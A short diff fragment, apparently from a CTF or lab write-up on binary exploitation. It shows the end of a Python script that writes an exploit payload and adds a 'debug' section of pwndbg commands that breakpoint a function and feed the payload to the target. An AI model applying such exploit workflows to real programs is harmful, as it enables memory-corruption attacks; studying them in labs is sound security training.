@@ -93,3 +93,14 @@ payload = (
 )
 sys.stdout.buffer.write(payload+b'\n')
 ```
+
+## debug
+```bash
+pwndbg> set follow-fork-mode child
+pwndbg> disassemble buf
+ (snip)
+pwndbg> b *buf+45
+Breakpoint 1 at 0x80491a3
+pwndbg> ! ./exploit1.py >payload
+pwndbg> r <payload 
+```
